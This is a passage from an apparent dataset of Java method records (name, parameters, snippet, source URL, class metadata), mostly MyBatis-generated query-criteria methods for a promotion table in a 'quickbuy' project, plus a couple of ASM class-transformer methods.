(Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameIn(List<String> values) {            addCriterion(\"promo_name in\", values, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameNotIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameNotIn(List<String> values) {            addCriterion(\"promo_name not in\", values, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameBetween(String value1, String value2) {            addCriterion(\"promo_name between\", value1, value2, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameNotBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameNotBetween(String value1, String value2) {            addCriterion(\"promo_name not between\", value1, value2, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateIsNull() {            addCriterion(\"start_date is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateIsNotNull() {            addCriterion(\"start_date is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateEqualTo(Date value) {            addCriterion(\"start_date =\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateNotEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateNotEqualTo(Date value) {            addCriterion(\"start_date <>\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateGreaterThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateGreaterThan(Date value) {            addCriterion(\"start_date >\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateGreaterThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateGreaterThanOrEqualTo(Date value) {            addCriterion(\"start_date >=\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateLessThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateLessThan(Date value) {            addCriterion(\"start_date <\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateLessThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateLessThanOrEqualTo(Date value) {            addCriterion(\"start_date <=\", value, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateIn(List<Date> values) {            addCriterion(\"start_date in\", values, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateNotIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateNotIn(List<Date> values) {            addCriterion(\"start_date not in\", values, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateBetween(Date value1, Date value2) {            addCriterion(\"start_date between\", value1, value2, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStartDateNotBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStartDateNotBetween(Date value1, Date value2) {            addCriterion(\"start_date not between\", value1, value2, \"startDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateIsNull() {            addCriterion(\"end_date is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateIsNotNull() {            addCriterion(\"end_date is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateEqualTo(Date value) {            addCriterion(\"end_date =\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateNotEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateNotEqualTo(Date value) {            addCriterion(\"end_date <>\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateGreaterThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateGreaterThan(Date value) {            addCriterion(\"end_date >\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateGreaterThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateGreaterThanOrEqualTo(Date value) {            addCriterion(\"end_date >=\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateLessThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateLessThan(Date value) {            addCriterion(\"end_date <\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateLessThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateLessThanOrEqualTo(Date value) {            addCriterion(\"end_date <=\", value, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateIn(List<Date> values) {            addCriterion(\"end_date in\", values, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateNotIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateNotIn(List<Date> values) {            addCriterion(\"end_date not in\", values, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateBetween(Date value1, Date value2) {            addCriterion(\"end_date between\", value1, value2, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andEndDateNotBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andEndDateNotBetween(Date value1, Date value2) {            addCriterion(\"end_date not between\", value1, value2, \"endDate\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIsNull() {            addCriterion(\"item_id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIsNotNull() {            addCriterion(\"item_id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdEqualTo(Integer value) {            addCriterion(\"item_id =\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotEqualTo(Integer value) {            addCriterion(\"item_id <>\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdGreaterThan(Integer value) {            addCriterion(\"item_id >\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdGreaterThanOrEqualTo(Integer value) {            addCriterion(\"item_id >=\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdLessThan(Integer value) {            addCriterion(\"item_id <\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdLessThanOrEqualTo(Integer value) {            addCriterion(\"item_id <=\", value, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdIn(List<Integer> values) {            addCriterion(\"item_id in\", values, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotIn(List<Integer> values) {            addCriterion(\"item_id not in\", values, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdBetween(Integer value1, Integer value2) {            addCriterion(\"item_id between\", value1, value2, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemIdNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemIdNotBetween(Integer value1, Integer value2) {            addCriterion(\"item_id not between\", value1, value2, \"itemId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceIsNull() {            addCriterion(\"promo_item_price is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceIsNotNull() {            addCriterion(\"promo_item_price is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceEqualTo(BigDecimal value) {            addCriterion(\"promo_item_price =\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceNotEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceNotEqualTo(BigDecimal value) {            addCriterion(\"promo_item_price <>\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceGreaterThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceGreaterThan(BigDecimal value) {            addCriterion(\"promo_item_price >\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceGreaterThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceGreaterThanOrEqualTo(BigDecimal value) {            addCriterion(\"promo_item_price >=\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceLessThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceLessThan(BigDecimal value) {            addCriterion(\"promo_item_price <\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceLessThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceLessThanOrEqualTo(BigDecimal value) {            addCriterion(\"promo_item_price <=\", value, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceIn(List<BigDecimal> values) {            addCriterion(\"promo_item_price in\", values, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceNotIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceNotIn(List<BigDecimal> values) {            addCriterion(\"promo_item_price not in\", values, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"promo_item_price between\", value1, value2, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoItemPriceNotBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoItemPriceNotBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"promo_item_price not between\", value1, value2, \"promoItemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCondition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getCondition() {            return condition;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            return value;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSecondValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getSecondValue() {            return secondValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isNoValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isNoValue() {            return noValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isSingleValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSingleValue() {            return singleValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isBetweenValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isBetweenValue() {            return betweenValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isListValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isListValue() {            return listValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getTypeHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTypeHandler() {            return typeHandler;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "transform", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] transform(byte[] classFile) {        return transform(new ClassReader(classFile));    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/weave/AsmClassTransformer.java", "stars": "3", "class": {"name": "AsmClassTransformer", "extends": null, "implements": ["ClassTransformer"], "modifiers": ["public"]}}, {"method_name": "transform", "params": ["ClassReader"], "throws": null, "modifiers": 